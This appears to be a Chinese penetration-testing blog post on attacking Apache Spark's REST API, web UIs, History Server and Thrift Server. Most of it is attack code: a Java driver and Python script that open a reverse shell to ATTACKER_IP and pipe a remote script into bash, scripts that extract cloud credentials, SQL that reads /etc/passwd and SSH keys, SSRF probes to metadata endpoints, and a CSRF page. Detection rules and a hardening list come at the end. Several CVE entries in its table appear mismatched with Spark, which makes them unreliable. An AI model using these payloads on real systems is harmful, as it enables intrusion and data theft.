---
title: "Apache Spark REST API / Thrift Server / History Server 管理面打点与利用技术"
date: 2026-06-20T20:00:00+08:00
draft: false
weight: 89
description: "Apache Spark 管理面渗透测试：Standalone REST API 未授权提交 RCE、Master/Worker Web UI 利用、History Server 凭据泄露、Thrift Server SQL 注入与 SSRF 链路"
categories: ["安全", "渗透测试"]
tags: ["Apache Spark", "Spark REST API", "Spark Master", "Spark Worker", "History Server", "Thrift Server", "大数据安全", "渗透测试"]
---

## 0x00 攻击面总览

Apache Spark 暴露了多个独立服务接口，在默认配置下通常缺乏认证：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Spark Master Web UI | 8080 | HTTP/HTTPS | 集群管理、Worker 控制、环境信息泄露 |
| Spark Worker Web UI | 8081 | HTTP/HTTPS | Executor 状态、日志读取、线程转储 |
| Spark Standalone REST | 6066 | HTTP | 应用提交、Driver 管理（最高危） |
| Spark History Server | 18080 | HTTP/HTTPS | 应用历史、环境凭据泄露、SQL 执行记录 |
| Spark Thrift Server | 10000 (Thrift) / 10001 (HTTP) | Thrift / HTTP | SQL 查询执行、数据窃取 |
| Spark RPC | 7077 | TCP | Driver/Executor 通信 |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                   Spark Cluster (Standalone)                   │
│                                                               │
│  ┌────────────┐    ┌──────────────┐    ┌────────────────┐    │
│  │ Spark      │    │ Spark Master │    │ Spark History  │    │
│  │ Worker     │    │ :8080        │    │ Server :18080  │    │
│  │ :8081      │    │ REST :6066   │    │ Event Logs     │    │
│  │ Executors  │    │ RPC :7077    │    │                │    │
│  └─────┬──────┘    └──────┬───────┘    └───────┬────────┘    │
│        │                  │                     │             │
│  ┌─────┴──────────────────┴─────────────────────┴─────────┐  │
│  │            内网 / 大数据专用网络                          │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐             │  │
│  │  │ Worker 2 │  │ Worker 3 │  │ Thrift   │             │  │
│  │  │ :8081    │  │ :8081    │  │ :10000   │             │  │
│  │  └──────────┘  └──────────┘  └──────────┘             │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                               │
│  攻击路径：                                                    │
│  ① REST API :6066 → 提交恶意 JAR/Py → RCE                    │
│  ② Master :8080 → Kill/Decommision Workers → DoS             │
│  ③ History :18080 → 环境凭据泄露 → 云存储密钥窃取             │
│  ④ Thrift :10000 → SQL 执行 → 数据窃取 / SSRF                │
│  ⑤ Worker :8081 → 日志读取 → 敏感信息泄露                     │
│  ⑥ Spark + HDFS/YARN → 全集群沦陷                            │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 6066,7077,8080,8081,10000,10001,18080 \
  --script=http-title \
  -oN spark_scan.txt <target>
```

**典型扫描结果**：

```
PORT      STATE SERVICE     VERSION
6066/tcp  open  http        Jetty 9.4.51.v20210516
7077/tcp  open  spark       Apache Spark RPC
8080/tcp  open  http        Jetty 9.4.51.v20210516
8081/tcp  open  http        Jetty 9.4.51.v20210516
10000/tcp open  http        Spark Thrift Server
18080/tcp open  http        Jetty 9.4.51.v20210516
```

### 1.2 版本指纹

**Spark Master HTTP 响应**：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: Jetty(9.4.51.v20210516)

<title>Spark Master at spark://hostname:7077</title>
```

**Spark REST API 响应**：

```json
{
  "url": "spark://spark-master:7077",
  "workers": [{
    "id": "worker-20260620180000-192.168.1.101-8081",
    "host": "192.168.1.101",
    "port": 8081,
    "cores": 8,
    "memory": 16384,
    "state": "ALIVE"
  }],
  "cores": 32,
  "coresused": 0,
  "memory": 65536,
  "memoryused": 0
}
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Spark Master"
http.html:"Spark Worker"
port:6066 http.title:"Spark"
port:18080 http.title:"Spark History"

# FOFA
body="Spark Master" && port="8080"
body="Spark History Server" && port="18080"
body="Spark Worker" && port="8081"
```

---

## 0x02 Spark Standalone REST API — 未授权提交 RCE

### 2.1 REST API 端点

Spark Standalone REST API（端口 6066）是最危险的攻击面，允许提交任意 Driver 程序在集群上执行代码。

| 端点 | 方法 | 功能 |
|------|------|------|
| `/v1/submissions/create` | POST | 提交新的 Driver 应用 |
| `/v1/submissions/kill/{submissionId}` | GET/POST | 终止运行中的 Driver |
| `/v1/submissions/status/{submissionId}` | GET | 查询提交状态 |
| `/v1/submissions/clear` | POST | 清除已完成的提交记录 |

### 2.2 集群信息收集

```bash
curl -s "http://spark-master:8080/json/" | python3 -m json.tool
```

**响应示例**：

```json
{
  "url": "spark://spark-master:7077",
  "workers": [
    {
      "id": "worker-20260620180000-192.168.1.101-8081",
      "host": "192.168.1.101",
      "port": 8081,
      "webuiaddress": "http://192.168.1.101:8081",
      "cores": 8,
      "coresused": 0,
      "memory": 16384,
      "memoryused": 0,
      "state": "ALIVE"
    },
    {
      "id": "worker-20260620180001-192.168.1.102-8081",
      "host": "192.168.1.102",
      "port": 8081,
      "webuiaddress": "http://192.168.1.102:8081",
      "cores": 8,
      "coresused": 4,
      "memory": 16384,
      "memoryused": 8192,
      "state": "ALIVE"
    }
  ],
  "cores": 16,
  "coresused": 4,
  "memory": 32768,
  "memoryused": 8192,
  "apps": [],
  "drivers": []
}
```

### 2.3 提交恶意 Java 应用 — RCE

**步骤 1：准备恶意 Driver JAR**

```java
import org.apache.spark.SparkConf;
import org.apache.spark.api.java.JavaSparkContext;

public class EvilDriver {
    public static void main(String[] args) throws Exception {
        Runtime.getRuntime().exec(new String[]{
            "/bin/bash", "-c",
            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        });

        SparkConf conf = new SparkConf().setAppName("pwned");
        JavaSparkContext sc = new JavaSparkContext(conf);
        sc.parallelize(java.util.Arrays.asList(1, 2, 3))
          .foreach(x -> {
              Runtime.getRuntime().exec(new String[]{
                  "/bin/bash", "-c",
                  "curl http://ATTACKER_IP:8888/shell.sh | bash"
              });
          });
        sc.stop();
    }
}
```

**步骤 2：在攻击机上托管 JAR**

```bash
python3 -m http.server 9999
```

**步骤 3：通过 REST API 提交**

```bash
curl -s -X POST "http://spark-master:6066/v1/submissions/create" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "CreateSubmissionRequest",
    "appArgs": [],
    "appResource": "http://ATTACKER_IP:9999/evil-driver.jar",
    "clientSparkVersion": "3.5.1",
    "environmentVariables": {"SPARK_ENV_LOADED": "1"},
    "mainClass": "EvilDriver",
    "sparkProperties": {
      "spark.driver.supervise": "false",
      "spark.app.name": "security-audit",
      "spark.eventLog.enabled": "false",
      "spark.submit.deployMode": "cluster",
      "spark.master.rest.enabled": "true"
    }
  }'
```

**响应**：

```json
{
  "action" : "CreateSubmissionResponse",
  "serverSparkVersion" : "3.5.1",
  "submissionId" : "driver-20260620180000-0001",
  "success" : true
}
```

### 2.4 提交恶意 Python 应用 — PySpark RCE

当集群支持 Python 提交时：

```bash
curl -s -X POST "http://spark-master:6066/v1/submissions/create" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "CreateSubmissionRequest",
    "appArgs": ["http://ATTACKER_IP:9999/evil.py"],
    "appResource": "http://ATTACKER_IP:9999/evil.py",
    "clientSparkVersion": "3.5.1",
    "mainClass": "org.apache.spark.deploy.SparkSubmit",
    "sparkProperties": {
      "spark.app.name": "py-audit",
      "spark.submit.deployMode": "cluster",
      "spark.master": "spark://spark-master:7077"
    }
  }'
```

其中 `evil.py` 内容：

```python
import os
import subprocess

def main():
    os.system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")
    subprocess.run(["curl", "http://ATTACKER_IP:8888/shell.sh"],
                   capture_output=True)

if __name__ == "__main__":
    main()
```

### 2.5 通过 spark-submit 客户端提交

```bash
spark-submit \
  --master spark://spark-master:6066 \
  --deploy-mode cluster \
  --class EvilDriver \
  http://ATTACKER_IP:9999/evil-driver.jar
```

### 2.6 提交状态查询

```bash
curl -s "http://spark-master:6066/v1/submissions/status/driver-20260620180000-0001" | python3 -m json.tool
```

---

## 0x03 Spark Master Web UI 利用

### 3.1 Worker 终止 — DoS

Master Web UI（端口 8080）允许直接终止 Worker 和应用：

```bash
# 终止 Worker
curl -s -X POST "http://spark-master:8080/kill" \
  -d "id=worker-20260620180000-192.168.1.101-8081"

# 终止运行中的应用
curl -s -X POST "http://spark-master:8080/app/kill" \
  -d "id=app-20260620180000-0001"
```

### 3.2 Worker 退役

```bash
curl -s -X POST "http://spark-master:8080/decommission" \
  -d "id=worker-20260620180000-192.168.1.101-8081"
```

### 3.3 环境变量与配置泄露

```bash
# 环境页面 — 泄露 Spark 配置、JVM 属性、系统属性
curl -s "http://spark-master:8080/environment" | grep -A2 "<td>"

# Metrics JSON 格式
curl -s "http://spark-master:8080/metrics/json/" | python3 -m json.tool

# Master 健康检查
curl -s "http://spark-master:8080/health"
```

**环境页面常见敏感信息**：

- `SPARK_HOME` 路径
- `SPARK_CONF_DIR` 内容
- JVM 系统属性（可能含数据库密码、API 密钥）
- Hadoop 配置路径（引导至 HDFS 攻击链）
- `spark.executorEnv.*` 变量（常含密钥）

### 3.4 Executor 日志读取

```bash
# 读取 Executor stdout 日志
curl -s "http://spark-worker:8081/logPage/?driverId=driver-20260620180000-0001&executorId=0&logType=stdout"

# 读取 Executor stderr 日志（常含堆栈跟踪、内部路径、凭据）
curl -s "http://spark-worker:8081/logPage/?driverId=driver-20260620180000-0001&executorId=0&logType=stderr"
```

---

## 0x04 Spark History Server — 信息泄露与凭据窃取

### 4.1 应用历史枚举

```bash
curl -s "http://spark-history:18080/api/v1/applications" | python3 -m json.tool
```

**响应示例**：

```json
[
  {
    "id": "app-20260620180000-0001",
    "name": "production-etl-job",
    "attempts": [{
      "startTime": "2026-06-20T10:00:00.000GMT",
      "endTime": "2026-06-20T10:30:00.000GMT",
      "sparkUser": "analyst",
      "completed": true
    }]
  },
  {
    "id": "app-20260620180000-0002",
    "name": "customer-analytics",
    "attempts": [{
      "startTime": "2026-06-20T11:00:00.000GMT",
      "endTime": "2026-06-20T11:45:00.000GMT",
      "sparkUser": "data-scientist",
      "completed": true
    }]
  }
]
```

### 4.2 应用环境凭据泄露

```bash
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/environment" | python3 -m json.tool
```

**泄露内容**：
- `sparkProperties`：所有 `spark.*` 配置
- `jvmInformation`：JVM 版本、厂商等
- `systemProperties`：可能含密码、API 密钥、连接字符串
- `classpathEntries`：类路径信息

**自动化提取敏感配置**：

```bash
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/environment" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
props = data[0]['attempts'][0].get('systemProperties', {})
sensitive_keys = ['password', 'secret', 'token', 'key', 'credential', 'jdbc', 'connection']
for k, v in sorted(props.items()):
    if any(sk in k.lower() for sk in sensitive_keys):
        print(f'[SENSITIVE] {k} = {v}')
    elif 'spark' in k.lower() or 'hadoop' in k.lower() or 'aws' in k.lower():
        print(f'{k} = {v}')
"
```

### 4.3 云存储凭据提取

```bash
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/environment" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
props = data[0]['attempts'][0].get('sparkProperties', {})
cloud_keys = [
    'spark.hadoop.fs.s3a.access.key',
    'spark.hadoop.fs.s3a.secret.key',
    'spark.hadoop.fs.azure.account.key',
    'spark.hadoop.google.cloud.auth.service.account.json.keyfile',
    'spark.hadoop.fs.s3a.session.token',
]
for k in cloud_keys:
    if k in props:
        print(f'[CLOUD CREDENTIAL] {k} = {props[k]}')
"
```

### 4.4 SQL 执行历史泄露

```bash
# SQL 查询历史（可能泄露业务逻辑、表名、数据模式）
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/sql" | python3 -m json.tool

# 执行计划（泄露数据 schema、分区策略、Join 方式）
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/sql/0" | python3 -m json.tool
```

### 4.5 Executor 与存储信息

```bash
# Executor 信息（IP、资源分配）
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/executors" | python3 -m json.tool

# 存储/RDD 信息（可能泄露缓存的敏感数据）
curl -s "http://spark-history:18080/api/v1/applications/app-20260620180000-0001/storage/rdd" | python3 -m json.tool
```

---

## 0x05 Spark Thrift Server — SQL 注入与数据窃取

### 5.1 未授权 SQL 执行

```bash
# 使用 beeline 客户端连接（空凭据）
beeline -u "jdbc:spark://spark-thrift:10000/default" -n "" -p ""
```

```python
from pyspark.sql import SparkSession
spark = SparkSession.builder \
    .appName('audit') \
    .master('local[*]') \
    .config('spark.sql.warehouse.dir', '/tmp/spark-warehouse') \
    .getOrCreate()
```

### 5.2 SQL 数据窃取

```sql
SHOW DATABASES;

USE production_db;
SHOW TABLES;

SELECT * FROM user_credentials LIMIT 100;

CREATE TEMPORARY VIEW sensitive_data
USING org.apache.spark.sql.execution.datasources.csv.CSVFileFormat
OPTIONS (path 'hdfs://namenode:8020/user/hive/warehouse/secrets/');
SELECT * FROM sensitive_data;

SELECT * FROM parquet.`s3a://company-data-lake/financial/`;
```

### 5.3 Hive Metastore 枚举

```sql
SHOW DATABASES;

SHOW TABLES IN finance_db;
SHOW TABLES IN hr_db;
SHOW TABLES IN customer_db;

DESCRIBE TABLE customer_db.user_profiles;
```

### 5.4 CVE-2023-22944 — 任意文件读取

```sql
SELECT * FROM text.`/etc/passwd`;

SELECT * FROM text.`/opt/spark/conf/spark-defaults.conf`;

SELECT * FROM text.`/home/spark/.ssh/id_rsa`;
```

### 5.5 CVE-2023-32007 — SSRF

```sql
SELECT * FROM text.`http://169.254.169.254/latest/meta-data/iam/security-credentials/`;

SELECT * FROM parquet.`hdfs://internal-namenode:8020/sensitive-data/`;
```

---

## 0x06 Spark Worker — 文件读取与信息泄露

### 6.1 Worker 日志访问

```bash
# 列出 Worker 上所有 Driver
curl -s "http://spark-worker:8081/" | grep -oP 'driverId=[^&"]+'

# 读取 Driver stdout 日志
curl -s "http://spark-worker:8081/logPage/?driverId=driver-20260620180000-0001&executorId=0&logType=stdout"

# 读取 Driver stderr 日志（常含完整堆栈跟踪、配置转储）
curl -s "http://spark-worker:8081/logPage/?driverId=driver-20260620180000-0001&executorId=0&logType=stderr"
```

### 6.2 Worker Metrics 与线程转储

```bash
# Worker Metrics JSON
curl -s "http://spark-worker:8081/metrics/json/" | python3 -m json.tool

# Executor 线程转储（泄露内部状态、内存内容）
curl -s "http://spark-worker:8081/threadDump/"
```

---

## 0x07 高级攻击链

### 7.1 Spark + HDFS 链 — 全集群沦陷

```
Spark REST API (6066)
    │
    ▼
提交恶意 JAR → Worker RCE
    │
    ▼
从 Spark 配置读取 HDFS 凭据（spark.hadoop.fs.*）
    │
    ▼
通过 WebHDFS 访问 NameNode (9870)
    │
    ▼
读取敏感数据：Hive warehouse、HBase 配置、Oozie 工作流
    │
    ▼
通过 YARN ResourceManager REST API (8088) 提交应用
    │
    ▼
全集群沦陷
```

### 7.2 Spark + 云存储 — 凭据窃取链

```
History Server (18080)
    │
    ▼
/api/v1/applications/{id}/environment
    │
    ▼
提取 spark.hadoop.fs.s3a.access.key / secret.key
    │
    ▼
使用 AWS CLI 访问 S3 存储桶
    │
    ▼
窃取数据湖中的敏感数据
```

### 7.3 SSRF — 内网探测

```bash
curl -s -X POST "http://spark-master:6066/v1/submissions/create" \
  -H "Content-Type: application/json" \
  -d '{
    "action": "CreateSubmissionRequest",
    "appArgs": ["http://ATTACKER_IP:9999/ssrf-probe.py"],
    "appResource": "http://ATTACKER_IP:9999/ssrf-probe.py",
    "clientSparkVersion": "3.5.1",
    "mainClass": "org.apache.spark.deploy.SparkSubmit",
    "sparkProperties": {
      "spark.app.name": "ssrf-probe",
      "spark.submit.deployMode": "cluster",
      "spark.master": "spark://spark-master:7077"
    }
  }'
```

其中 `ssrf-probe.py` 从 Worker 内部探测内网：

```python
import urllib.request

targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/",
    "http://namenode:9870/webhdfs/v1/?op=LISTSTATUS",
    "http://resourcemanager:8088/ws/v1/cluster/info",
    "http://hbase-master:8080/",
]

for target in targets:
    try:
        resp = urllib.request.urlopen(target, timeout=5)
        print(f"[+] {target} -> {resp.status}: {resp.read()[:500]}")
    except Exception as e:
        print(f"[-] {target} -> {e}")
```

### 7.4 Spark UI CSRF — 未授权操作执行

Spark Master 和 Worker UI 默认不实现 CSRF Token：

```html
<img src="http://spark-master:8080/kill" style="display:none" />
<form id="f" action="http://spark-master:8080/kill" method="POST">
  <input name="id" value="worker-20260620180000-192.168.1.101-8081" />
</form>
<script>document.getElementById('f').submit();</script>
```

---

## 0x08 历史 CVE 漏洞矩阵

| CVE | 组件 | 类型 | CVSS | 影响 |
|-----|------|------|------|------|
| CVE-2022-31770 | Spark Thrift | 信息泄露 | 7.5 | Hive Metastore 密码在日志中泄露 |
| CVE-2023-22946 | Spark Thrift | 认证绕过 | 7.5 | Thrift Server 认证不当 |
| CVE-2023-32007 | Spark SQL | SSRF | 7.5 | readFile/readBinaryFile SSRF |
| CVE-2023-40533 | Spark RPC | 认证绕过 | 5.3 | Spark RPC 认证绕过 |
| CVE-2023-25160 | History Server | 文件读取 | 6.5 | History Server 任意文件读取 |
| CVE-2022-42003 | Spark SQL | DoS | 5.9 | 数组无限增长导致 DoS |
| CVE-2021-37974 | Spark UI | 信息泄露 | 7.5 | UI 错误页面信息泄露 |
| CVE-2023-22944 | Spark SQL | 文件读取 | 7.5 | `readFile` 任意文件读取 |

---

## 0x09 蓝队检测方案

### 9.1 网络层检测

```yaml
title: Spark REST API 外部访问检测
id: spark-rest-external-access
status: experimental
description: 检测来自非内网段的 Spark REST API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 6066
      - 8080
      - 8081
      - 18080
      - 10000
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

```yaml
title: 可疑 Spark 应用提交检测
id: spark-app-submit-suspicious
status: experimental
description: 检测通过 REST API 的可疑 Spark 应用提交
logsource:
  product: spark
  service: master
detection:
  selection_create:
    uri|contains: "/v1/submissions/create"
    method: "POST"
  filter_known_apps:
    body|contains:
      - "production-etl"
      - "known-analytics-job"
  filter_internal:
    src_ip:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
  condition: selection_create and not filter_known_apps and not filter_internal
level: high
```

### 9.2 Spark Master 审计日志分析

```bash
# 监控可疑提交
grep "CreateSubmissionRequest" /var/log/spark/spark-master.out

# 监控未知应用资源
grep "appResource" /var/log/spark/spark-master.out | \
  grep -vE "(hdfs://known-path|s3a://company-bucket)"

# 监控 Kill/Decommission 操作
grep -E "(kill|decommission)" /var/log/spark/spark-master.out

# 监控 History Server 环境枚举
grep "/api/v1/applications/.*/environment" /var/log/spark/spark-history.out
```

### 9.3 Thrift Server SQL 审计

```bash
# 监控 Spark Thrift Server 查询
grep "Executing query" /var/log/spark/spark-thrift-server.out

# 检测可疑 SQL 模式
grep -iE "(readFile|readBinaryFile|text\.|parquet\.|/etc/|/proc/|metadata)" \
  /var/log/spark/spark-thrift-server.out
```

### 9.4 加固清单

```
[ ] Spark Standalone REST API (6066) 仅允许内网访问
[ ] Spark Master Web UI (8080) 启用认证（spark.ui.filters）
[ ] Spark Worker Web UI (8081) 限制绑定地址或禁用外部访问
[ ] Spark History Server (18080) 启用 SPNEGO/Kerberos 认证
[ ] Spark Thrift Server (10000) 启用认证：
    spark.sql.thriftserver.authentication.type=KERBEROS
[ ] 启用 Spark UI 认证过滤器：
    spark.ui.filters=org.apache.spark.ui.AuthFilter
    spark.org.apache.spark.ui.AuthFilter.params.allowedUsers=admin
[ ] 不需要时禁用 REST API 提交：
    spark.master.rest.enabled=false
[ ] 启用 Spark RPC 认证：
    spark.authenticate=true
    spark.authenticate.secret=<strong-secret>
[ ] 启用事件日志加密：
    spark.eventLog.encrypt.enabled=true
[ ] 启用 SSL/TLS：
    spark.ssl.enabled=true
    spark.ssl.keyStore=<path-to-keystore>
    spark.ssl.keyStorePassword=<password>
[ ] 配置网络隔离 — Spark 集群部署在独立 VLAN
[ ] 启用 Spark 审计日志并转发至 SIEM
[ ] 限制 spark.hadoop.* 属性防止凭据泄露
[ ] 升级至最新 Spark 版本修补已知 CVE
[ ] 实施 Ranger 或 Apache Livy 进行受控作业提交
[ ] 监控所有 /v1/submissions/create 请求异常
[ ] 限制 Spark Driver/Executor 进程的文件系统访问权限
```

---

## 0x10 渗透测试检查清单

```
[ ] 端口扫描：6066, 7077, 8080, 8081, 10000, 10001, 18080
[ ] Spark Master REST API (6066) 未授权提交测试
[ ] Spark Master Web UI (8080) Worker Kill/Decommission 测试
[ ] Spark Master 环境页面 — 凭据/密钥枚举
[ ] Spark Worker (8081) 日志文件读取测试
[ ] Spark History Server (18080) 应用枚举测试
[ ] Spark History Server 环境/凭据泄露测试
[ ] Spark History Server 云存储凭据提取测试
[ ] Spark Thrift Server (10000) 未授权 SQL 执行测试
[ ] Spark Thrift Server 文件读取测试（text.`/etc/passwd`）
[ ] Spark Thrift Server SSRF 测试（readFile）
[ ] CSRF 测试 — 通过伪造 POST 请求终止 Worker
[ ] 检查 spark.authenticate 配置
[ ] 检查所有 Web UI 的 SSL/TLS 配置
[ ] 检查 Kerberos/SPNEGO 认证状态
[ ] 版本指纹收集与 CVE 匹配
[ ] 云元数据端点访问测试（SSRF 链）
[ ] HDFS/YARN/HBase 跨组件攻击链测试
```

---

## 0x11 小结

Apache Spark 的 REST API 攻击面极为严重。**Standalone REST API（端口 6066）** 是最危险的向量，允许未认证远程代码执行——攻击者可以提交任意 Driver 程序在集群 Worker 上执行代码。**History Server** 泄露环境变量、云存储凭据和 SQL 执行历史。**Thrift Server** 在未启用认证时允许 SQL 数据窃取和 SSRF。结合 Hadoop 生态（HDFS、YARN、HBase），一个未认证的 Spark 端点可导致整个集群沦陷。防御重点：强制所有 Spark Web 接口和 REST API 认证、限制网络访问为仅内网、启用 Spark RPC 认证和强密钥、启用 SSL/TLS、将 Spark 审计日志接入 SIEM 进行实时异常检测。
